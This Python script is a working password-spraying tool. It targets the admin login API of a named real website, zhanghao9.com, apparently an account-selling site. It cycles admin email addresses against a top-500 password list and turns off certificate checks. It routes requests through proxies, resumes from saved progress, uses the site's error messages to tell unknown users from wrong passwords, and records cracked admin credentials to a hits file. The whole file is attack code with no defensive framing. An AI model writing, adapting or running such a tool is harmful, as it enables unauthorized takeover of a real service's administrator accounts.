#!/usr/bin/env python3
"""zhanghao9 后台邮箱登录喷洒（无验证码，断点续跑）。"""
from __future__ import annotations

import argparse
import json
import sys
import time
from pathlib import Path

import requests

ROOT = Path(__file__).resolve().parents[2]
sys.path.insert(0, str(ROOT))

from faka_common import DEFAULT_UA, load_wordlist, resolve_proxy  # noqa: E402

OUT_DIR = Path("/data/tools/faka/out/zh9")
if not OUT_DIR.parent.exists():
    OUT_DIR = ROOT / "out" / "zh9"
OUT_DIR.mkdir(parents=True, exist_ok=True)

PROGRESS = OUT_DIR / "admin_spray_progress.json"
HITS = OUT_DIR / "admin_login_hits.jsonl"
LOG = OUT_DIR / "admin_spray_bg.log"

EMAILS = ROOT / "data" / "zh9_admin_emails.txt"
PASSWORDS = ROOT / "data" / "top500_passwords.txt"
BASE = "https://zhanghao9.com"
ENDPOINT = "/admin/api/authentication/login"


def log(msg: str) -> None:
    line = f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] {msg}"
    print(line, flush=True)
    with LOG.open("a", encoding="utf-8") as f:
        f.write(line + "\n")


def load_progress() -> dict:
    if PROGRESS.exists():
        try:
            return json.loads(PROGRESS.read_text(encoding="utf-8"))
        except Exception:
            pass
    return {"email_idx": 0, "pass_idx": 0, "hits": 0}


def save_progress(state: dict) -> None:
    PROGRESS.write_text(json.dumps(state, ensure_ascii=False, indent=2), encoding="utf-8")


def try_login(email: str, password: str, proxy: str, timeout: int) -> tuple[bool, dict]:
    s = requests.Session()
    s.verify = False
    s.headers.update({"User-Agent": DEFAULT_UA, "Content-Type": "application/json"})
    if proxy:
        s.proxies = {"http": proxy, "https": proxy}
    try:
        r = s.post(
            BASE + ENDPOINT,
            json={"username": email, "password": password},
            timeout=timeout,
        )
        data = r.json() if r.text.strip().startswith("{") else {"raw": r.text[:200]}
    except Exception as e:
        return False, {"error": str(e)}

    msg = str(data.get("msg", ""))
    code = data.get("code")
    if code in (1, 200) or (isinstance(data.get("data"), dict) and data["data"].get("token")):
        return True, data
    if any(x in msg for x in ("成功", "success", "token", "登录成功")):
        return True, data
    if "不存在" in msg:
        return False, {"status": "no_user", **data}
    if any(x in msg for x in ("密码", "错误", "不正确")):
        return False, {"status": "bad_password", **data}
    return False, data


def parse_args() -> argparse.Namespace:
    ap = argparse.ArgumentParser()
    ap.add_argument("--proxy", default="auto")
    ap.add_argument("--sleep", type=float, default=0.5)
    ap.add_argument("--limit-pass", type=int, default=120)
    return ap.parse_args()


def main() -> int:
    args = parse_args()
    proxy = resolve_proxy(args.proxy)
    emails = list(load_wordlist(EMAILS))
    passwords = list(load_wordlist(PASSWORDS, limit=args.limit_pass))
    state = load_progress()
    hits = state.get("hits", 0)

    log(f"START emails={len(emails)} pass={len(passwords)} resume email_idx={state['email_idx']} proxy={'yes' if proxy else 'direct'}")

    for ei in range(state["email_idx"], len(emails)):
        email = emails[ei]
        pass_start = state["pass_idx"] if ei == state["email_idx"] else 0
        no_user = False

        for pi in range(pass_start, len(passwords)):
            pw = passwords[pi]
            state.update({"email_idx": ei, "pass_idx": pi, "hits": hits})
            if (pi + 1) % 10 == 0:
                save_progress(state)

            ok, data = try_login(email, pw, proxy, 15)
            status = data.get("status", "")

            if ok:
                hits += 1
                row = {"ts": time.strftime("%Y-%m-%d %H:%M:%S"), "email": email, "password": pw, "resp": data}
                with HITS.open("a", encoding="utf-8") as f:
                    f.write(json.dumps(row, ensure_ascii=False) + "\n")
                log(f"[+] ADMIN HIT {email}:{pw}")
                state["hits"] = hits
                save_progress(state)
                return 0

            if status == "no_user":
                log(f"[-] no_user {email}")
                no_user = True
                break

            if status == "bad_password":
                log(f"    bad_password {email} pass#{pi+1}")
            else:
                log(f"    {email}:{pw[:12]} -> {data.get('msg', data)}")

            time.sleep(args.sleep)

        state["pass_idx"] = 0
        save_progress(state)
        if no_user:
            continue

    log(f"DONE hits={hits}")
    return 0 if hits else 1


if __name__ == "__main__":
    raise SystemExit(main())
